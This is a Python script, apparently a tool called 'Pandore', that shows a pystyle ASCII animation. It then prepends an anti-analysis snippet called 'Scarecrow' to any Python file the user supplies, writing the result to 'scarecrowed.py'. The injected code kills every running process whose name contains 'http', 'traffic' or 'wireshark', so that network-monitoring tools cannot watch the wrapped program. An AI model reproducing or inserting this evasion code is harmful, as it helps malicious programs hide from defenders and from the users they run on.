from os import name, chdir
from os.path import isfile
from pystyle import Anime, Colorate, Colors, Center, System, Write

code = """# Scarecrow

# https://github.com/billythegoat356/Scarecrow


from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess

class scare:

    def fuck(names):
        for proc in process_iter():
            try:
                for name in names:
                    if name.lower() in proc.name().lower():
                        proc.kill()
            except (NoSuchProcess, AccessDenied, ZombieProcess):
                pass

    def crow():
        forbidden = ['http', 'traffic', 'wireshark']
        return scare.fuck(names=forbidden)
    
scare.crow()


# by billythegoat356
\n\n\n"""


if name == 'nt':
    path = '/'.join(__file__.split('\\')[:-1])
    chdir(path)


ascii = """
.-------.   ____   ,---.   .--.______        ,-----.   .-------.       .-''-. 
 \  _(`)_ \.'  __ `.|    \  |  |    _ `''.  .'  .-,  '. |  _ _   \    .'_ _   \  
 | (_ P._)/   '  \  |  ,  \ |  | _ | ) _  \/ ,-.|O \ _ \| ( ' )  |   / ( ` )   ' 
 |  (_,_) |___|  /  |  |\_ \|  |( ''_'  ) ;  \  '_ /  | |(_ R _) /  . (_ E _)  | 
 |   '-.-'   _.-`   |  _( )_\  | . (D) `. |  _`,/ \ _/  | (_,_).' __|  (_,_)___| 
 |   |    .'   _    | (_ N _)  |(_    ._) : (  '\_/ \   |  |\ \  |  '  \   .---. 
 |   |    |  _( )_  |  (_,_)\  |  (_.\.' / \ `'/. \  ) /|  | \ `'   /\  `-'    / 
 /   )    \ (_ A _) |  |    |  |       .'   '. \_/``'.' |  |  \    /  \       /  
 `---'     '.(_,_).''--'    '--'-----'`       '-----'   ''-'   `'-'    `'-..-' 
"""


flower = '''
This animation was made with *pystyle* :)

                ..ooo.
             .888888888.
           .888"P""T"T888 8o
         o8o 8.8"8 88o."8o 8o
        88 . o88o8 8 88."8 88P"o
       88 o8 88 oo.8 888 8 888 88
       88 88 88o888" 88"  o888 88
       88."8o."T88P.88". 88888 88
       888."888."88P".o8 8888 888
       "888o"8888oo8888 o888 o8P"
        "8888.""888P"P.888".88P
         "88888ooo  888P".o888
           ""8P"".oooooo8888P
  .oo888ooo.    888PANDORE88
o88888"888"88o.  "8888"".88   .oo888oo..
 8888" "88 88888.       88".o88888888"888.
 "8888o.""o 88"88o.    o8".888"888"88 "88P
  T888C.oo. "8."8"8   o8"o888 o88" ".=888"
   88BILLY8o "8 8 8  .8 .8"88 8"".o888o8P
    "8888C.o8o  8 8  8" 8 o" ...o"""8888
      "88888888 " 8 .8  8   8RASPUTIN8"
        "8888888o  .8o=" o8o..o(8oo88"
            "888" 88"    888888888""
                o8P       "888"""
          ...oo88
 "8oo...oo888""
'''




System.Size(140, 40)
System.Title("Pandore")
System.Clear()
Anime.Fade(Center.Center(flower), Colors.red_to_green, Colorate.Vertical, interval=0.025, enter=True)



def main():
    System.Clear()
    print("\n"*2)
    print(Colorate.Diagonal(Colors.red_to_yellow, Center.XCenter(ascii)))
    print("\n"*5)


    file = Write.Input("Drag a Python file -> ", Colors.red_to_yellow, interval=0.005)
    print()

    if not isfile(file):
        print(Colorate.Error("Error! This file does not exist!"))
        return

    with open(file, mode='r', encoding='utf-8') as f:
        content = f.read()

    content = code + content

    with open("scarecrowed.py", mode='w', encoding='utf-8') as f:
        f.write(content)

    Write.Input("Done!", Colors.red_to_yellow, interval=0.005)
    return exit()
        

if __name__ == '__main__':
    while True:
        main()